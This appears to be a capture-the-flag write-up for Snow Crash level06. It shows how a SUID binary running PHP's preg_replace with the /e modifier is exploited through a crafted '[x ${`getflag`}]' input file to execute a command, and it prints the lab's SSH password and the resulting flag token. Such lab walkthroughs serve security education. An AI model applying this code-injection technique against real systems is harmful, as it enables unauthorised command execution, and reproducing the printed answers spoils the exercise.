# Level06

Login as `level06`

```bash
┌──$ [~/42/2021/snow-crash]
└─>  ssh 192.168.1.64 -p 4242 -l level06
level06@192.168.1.64's password: viuaaale9huek52boumoomioc
```

In the home there are 2 files, a `php script` and a `SUID executable`

```bash
level06@SnowCrash:~$ ls -l
total 12
-rwsr-x---+ 1 flag06 level06 7503 Aug 30  2015 level06
-rwxr-x---  1 flag06 level06  356 Mar  5  2016 level06.php
```

After running it and digging a bit deeper thorugh the executable with `hexdump` , `file` and `strings` we confirm that the executable executes the php code and this one prints the content of a file passed as parameter:

```bash
level06@SnowCrash:~$ ./level06
PHP Warning:  file_get_contents(): Filename cannot be empty in /home/user/level06/level06.php on line 4
level06@SnowCrash:~$ echo 'Hello World!' > /tmp/hello
level06@SnowCrash:~$ ./level06 /tmp/hello
Hello World!
```

`file_get_contents()` reads the entire file into a string.

There is a well known [exploit](https://captainnoob.medium.com/command-execution-preg-replace-php-function-exploit-62d6f746bda4) wiht php in `preg_replace` with /e

This breach allows to evaluate a part of the string given as parameter so our string will be considered as a php string.

In PHP, we can use the output of a function in a string by using some brackets:

```php
{${shell_exec(get_flag)}}
```

The difficulty is to make the string match the `regex` in the preg_replace call:

```php
reg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a)
```

regex -> `(\[x (.*)\])`. To match the regex, the string must start by `[x` and end with `]`:

```php
[x ${`get_flag`)}]
```

```bash
level06@SnowCrash:~$ echo '[x ${`getflag`}]' > /tmp/flag06
level06@SnowCrash:~$ ./level06 /tmp/flag06
PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
 in /home/user/level06/level06.php(4) : regexp code on line 1
```

So the flag is: `wiok45aaoguiboiki2tuin6ub`